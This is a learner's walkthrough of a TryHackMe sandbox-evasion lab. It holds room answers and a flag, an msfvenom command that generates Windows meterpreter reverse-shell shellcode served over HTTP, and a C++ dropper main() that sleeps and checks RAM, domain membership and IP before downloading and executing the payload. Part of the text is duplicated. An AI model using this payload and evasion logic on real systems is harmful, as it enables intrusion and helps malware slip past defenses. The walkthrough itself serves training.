<p align="center">March 6,2025</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{304}}$$-day-streak in  <a href="https://tryhackme.com/">TryHackMe</a>.</p>
 
<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Sandbox Evasion}}$$
</h1>
<p align="center">Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.</p>
<p align="center">Access this premium (subscribers only) hard-level walkthrough clicking <a href="https://tryhackme.com/room/sandboxevasion">Sandbox Evasion</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/b9c5de72-f65b-4d02-9650-6f416805941e">
  <img height="150px" src="https://github.com/user-attachments/assets/937d48cc-013b-44b6-b07b-5a82d531a711">
</p>

<br>
<h2>Task 1. Introduction</h2>
<br>


<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h4>
<br>

> 1.1. <em>Read the task above!</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. An Adversary walks into a Sandbox</h2>
<br>


<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 2.1. <em>Sandboxes are a form of ______ Analysis. Hint : This type of analysis involves running the code.</em><br><a id='2.1'></a>
>> <code><strong>Dynamic</strong></code>

<br>

> 2.2. <em>What type of Sandboxes analyze attachments attached to emails?</em><br><a id='2.1'></a>
>> <code><strong>Mail Sandbox</strong></code>

<br>
<h2>Task 3. Common Sandbox Evasion Techniques</h2>
<h3>An Introduction to Sandbox Evasion</h3>
<p>Now that you have a general idea of what Malware Sandboxes are, we can move on to learning some evasion techniques at a high level. We will be breaking this down into four different categories; in the next task, we will implement four different evasion techniques (one from each category), so you can leave this room with some practical knowledge to help out in your Red Team operations.<br><br>
We will be covering the following four broad categories:<br>
- Sleeping through Sandboxes<br>
- Geolocation and Geoblocking<br>
- Checking System Information<br>
- Querying Network Information<br><br>
These are ordered from the most basic techniques to the most advanced. Let's get started.</p>

<br>
<h3>Sleeping through Sandboxes</h3>
<p>Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that we can abuse; if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution.<br>

Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. Remember that it may take more or less time to do so based on the system's hardware. Masking your application is generally a good idea to avoid Anti-Virus detections in general, so this should already be something in your toolkit.<br>

Beware that some sandboxes may alter built-in sleep functions; various Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended you develop your own sleep function. Here are a couple of blog posts about bypassing Sleep functions:<br>

- https://evasions.checkpoint.com/src/Evasions/techniques/timing.html
- https://www.joesecurity.org/blog/660946897093663167</p>

<br>
<h3>Geolocation</h3>
<p>Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that we can abuse; if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution.<br>

Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. Remember that it may take more or less time to do so based on the system's hardware. Masking your application is generally a good idea to avoid Anti-Virus detections in general, so this should already be something in your toolkit.<br>

Beware that some sandboxes may alter built-in sleep functions; various Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended you develop your own sleep function. Here are a couple of blog posts about bypassing Sleep functions:<br>

- https://evasions.checkpoint.com/src/Evasions/techniques/timing.html<br>
- https://www.joesecurity.org/blog/660946897093663167<br>

IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining this with ARIN's RDAP allows you to determine the ISP returned in an easy to parse format (JSON). <br>

It is important to note that this method will only work if the host has internet access. Some organizations may build a block list of specific domains, so you should be 100% sure that this method will work for the organization you are attempting to leverage this against.</p>

<br>
<h3>Checking System Information</h3>

<p>[ ... ]</p>

<br>
<h3>Querying Network Information</h3>

<p>[ ... ]</p>


<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 3.1. <em>Read the above task to learn about Sandbox Evasion Techniques.</em><br><a id='3.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.2. <em>Download the task files and modify the .cpp file to retrieve the MSFVenom generated shellcode.</em><br><a id='3.2'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 3.3. <em>Which Sandbox Evasion method would you use to abuse a Sandbox that runs for a short period of time? Note: most Sandboxes are only allowed to run for a short period of time</em><br><a id='3.3'></a>
>> <code><strong>Sleeping</strong></code>

<br>

> 3.4. <em>Which Sandbox Evasion method would you use to check the Sandboxes system information for virtualised devices? Note: Sandboxes usually run with limited resources and virtualised devices</em><br><a id='3.4'></a>
>> <code><strong>Checking System Information</strong></code>

<br>

<p>My hands-on for this task:<br>
I created <code>index.raw</code> using <code>msfvenom</code>. Then set up a host.</p>

```shell
:~/SandboxEvasion# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Attack_IP LPORT=Attack_Port -f raw -o index.raw
...
Payload size: 510 bytes
Saved as: index.raw
:~/SandboxEvasion# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...

```

<br>
<h2>Task 4. Implementing Various Evasion Techniques</h2>
<br>

<h3>Diving into Sandbox Evasion</h3>

With this base code acquired, we will take our first step into the world of Sandbox Evasion. We're going to start with our sleep because it is the simplest. 

<h3>Taking a Nap</h3>h3>

<p>We can take our template code from the previous task and add a Sleep statement for 120,000MS  to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; however, 2 minutes will suffice for testing purposes. We'll now add our Sleep statement in the main function: </p>

<p>[ ... ]</p>

<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

> 4.1. <em>Read about implementing various Sandbox evasion techniques.</em><br><a id='4.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 4.2. <em>Which evasion method involves reaching out to a host to identify your IP Address?</em><br><a id='4.2'></a>
>> <code><strong>Geolocating Filtering</strong></code>

<br>

> 4.3. <em>Which evasion technique involves burning compute-time to escape the sandbox?</em><br><a id='4.3'></a>
>> <code><strong>Sleeping</strong></code>


<br>
<h2>Task 5. DIY Sandbox Evasion Challenge</h2>
<h3>The Great Escape</h3>
<p>[ ... ]</p>

<h3>Sandbox Evasion Binary</h3>
<p>[ ... ]</p>

<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h4>
<br>

> 5.1. <em>Create your own Sandbox Evasion executable using the code snippets in the task and the VM as reference.<br>
Run the "SandboxChecker.exe" in a command prompt (example above) providing your executable as the argument. All checks must be implemented correctly for the flag to reveal.<br>
Note: If you have done it right, the "Sleep Check" will take approximately one minute to reveal the flag.<br>
Note: If your DNS check has if(dcNewName.find("\\")) instead of if(dcNewName.find("\\\\")) then you may have difficulties with the sleep check.</em><br>
Hint : Make sure your Sleep check is before your Domain Controller Check if you're having issues with it.<br><a id='5.1'></a>
>> <code><strong>THM{6c1f95ec}</strong></code>

<br>

- Navigated to <code>THM-Sandbox-Evasion-VSPRJ</code>. After a while it failed so I used <code>xfreerdp</code> to access it.<br>

![image](https://github.com/user-attachments/assets/e7c26f70-71ad-4889-a051-979a2966c16b)


- Double-clicked <code>Materials</code><br>
- Clicked <code>dropper.cpp</code>, and pressing <code>Ctrl</code> selected <code>ad-check.cpp</code>, <code>geofiltering.cpp</code>, <code>memory-check.cpp</code>, and <code>sleep-check.cpp</code>.<br>

![image](https://github.com/user-attachments/assets/7b60a2c6-cce1-492c-90de-c722c12270eb)

<br>
- Right-clicked, and selected <code>Edit with Notepad++</code><br>

![image](https://github.com/user-attachments/assets/fc40cdf5-5ee1-4321-8b44-51496819ca5f)

<br>
<br>

![image](https://github.com/user-attachments/assets/b46faed3-8634-411c-90fe-54ea4ca92864)

- Inserted the highlighted code from <code>ad-check.cpp</code> into <code>dropper.cpp</code>. This is related to <code>Technique 1 : check and see if the devide is joined to an Active Directory Domain</code>.</h3><br>

![image](https://github.com/user-attachments/assets/4391dccc-f430-480d-bf0c-17a84cd5d0ea)

- Inserted the highlighted code from <code>memory-check.cpp</code> into <code>dropper.cpp</code>. This is related to <code>Technique 2 : Check if the system memory is greater than 1GB of RAM.</code>.</h3><br>

![image](https://github.com/user-attachments/assets/73dfed7b-d26c-4b3a-bc0c-6196518027df)


- Inserted the highlighted code from <code>geo-filtering.cpp</code> into <code>dropper.cpp</code>. This is related to <code>Technique 3 : mplement an outbound HTTP request to 10.10.10.10.</code>.</h3><br>

![image](https://github.com/user-attachments/assets/4010d28c-0546-4341-9ca5-d6030e7d577a)

- Remembered of the shell generated previously that has <code>510 bytes</code>, and updated it in <code>dropper.cpp</code><br>

```shell
:~/SandboxEvasion# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Attack_IP LPORT=Attack_Port -f raw -o index.raw
...
Payload size: 510 bytes
Saved as: index.raw
:~/SandboxEvasion# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...

```

![image](https://github.com/user-attachments/assets/dc34c89c-e1e0-4858-8ea2-0b57d167646d)

- Inserted the highlighted code from <code>geo-filtering.cpp</code> into <code>dropper.cpp</code>. This is related to <code>Technique 3 : mplement an outbound HTTP request to 10.10.10.10.</code>.</h3><br>

![image](https://github.com/user-attachments/assets/4010d28c-0546-4341-9ca5-d6030e7d577a)

- Launched <code>Task Manager</code>, discovered the <code>PID</code> of <code>explorer.exe</code>, and updated it into <code>dropper.cpp</code>.<br>

![image](https://github.com/user-attachments/assets/9ec028dd-b655-4a97-b383-eb57a255b546)

- Updated <code>dropper.cpp</code> adding the <code>Attack_IP</code> and <code>Attack_Port</code>.<br>

![image](https://github.com/user-attachments/assets/d32d0124-715e-4e71-93fa-8a276d4ccc0b)

- Updated the <code>payload size in bytes</code> again in two other places in our code.<br>

![image](https://github.com/user-attachments/assets/eb771940-8fee-41e9-8b5d-f3f8191efc4a)



- Substituted the <code>main() function</code> by the one below. The one that is the the native file just downloads and executes. This one will:<br>
           . check if the device has joined the <code>Active Domain Controller</code><br>
           . check if the <code>Memory</code> is greater than 1GB of RAM<br>
           . implement an outbound HTTP request<br>
           . guarantee a 60-seconde sleep time before my payload is retrieved from my web server.<br>
           . download and execute.<br>

```C++
int main() {
        Sleep(60000);
        if (isDomainController() == TRUE) {
                 if (memoryCheck() == TRUE) {
                          if (checkIP() == TRUE) {
        downloadAndExecute();

                          }

                 }
    }

    return 0;
}
```

<br>
- Saved and closed.<br>
- Launched <code>/code>.Visual Studio</code>.<br>
- Clicked <code>Create a new project</code>.<br>


![image](https://github.com/user-attachments/assets/3112e938-81a2-41e2-add8-f5c41576769d)


<br>

- Clicked <code>Resource Files</code>, <code>Add</code>, and <code>Existing Item ...</code>.<br>

![image](https://github.com/user-attachments/assets/48c788dc-7969-4cbf-a875-79b79a76e116)

<br>

- Double-clicked <code>dropper.cpp</code>.<br>

![image](https://github.com/user-attachments/assets/b2e8f7ff-ca84-4e99-b3c9-f40f7c7bb8c0)


<br>
- Clicked <code>Build</code>, and <code>Build Solution</code>.<br>

![image](https://github.com/user-attachments/assets/f329ce03-e1af-4021-b8cb-4458b1d59616)


<br>

![image](https://github.com/user-attachments/assets/1be5903a-dba0-4287-9724-c577a5ac6777)

<br>

- Clicked <code>Build</code>, then <code>Build Solution</code>.<br>

![image](https://github.com/user-attachments/assets/77b91ab5-5df3-4744-b482-cfbe53bd3e05)

<br>

- Inspected the <code>Output</code>, and succeeded!<br>
- Identified the path and name of the compiled file.<br>

![image](https://github.com/user-attachments/assets/5eaa6619-c419-4f3c-910d-73e7fabf889f)

<br>

- Launched <code>Command Prompt</code> as <code>Administrator</code>.

![image](https://github.com/user-attachments/assets/aa49fa8d-36fe-434b-9591-f694825677dd)




![image](https://github.com/user-attachments/assets/9aa0c1c8-7e9c-47d8-a30b-840b86e61b76)



C:\Users\Administrator\Desktop\Materials>.\SandboxChecker.exe C:\Users\Administrator\Desktop\Materials\Project1\x64\Debug\Project1.exe
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag: THM{6c1f95ec}
C:\Users\Administrator\Desktop\Materials>


![image](https://github.com/user-attachments/assets/10166516-866f-4afe-80b0-5a218a510db0)





C:\Users\Administrator\Desktop\Materials\My Sandbox Evasion\My Sandbox Evasion.vcxproj

- 




- Double-clicked it in <code>File Explorer</code>, opening it in <code>Visual Studio</code>.<br>
- Enabled <code>View</code> for <code>Solution Explorer</code>, and for <code>Properties</code><br>





<br>
<h2>Task 6. Wrapping Up</h2>
<br>

<h3>Wrapping Up</h3>

<p>In this room, we covered some modern and historic Sandbox evasion techniques that have been used by both red teamers and advanced threat actors alike. After finishing up this room, you should now have a general understanding of what a malware sandbox is, methods that you could try to use to evade it, and even some template code that you can build off of.<br>

This is by no means a fully comprehensive list of all of the Sandbox Evasion methods out there; we highly encourage you to go out and develop your own Sandbox Evasion techniques with the foundational knowledge learned from this room.</p>

<br>
<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h4>
<br>

> 6.1. <em>Read the closing task.</em><br><a id='6.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>



<h2>Room Compledted</h2>

![image](https://github.com/user-attachments/assets/73455121-c2c2-4c43-880d-b02eb51caf6f)



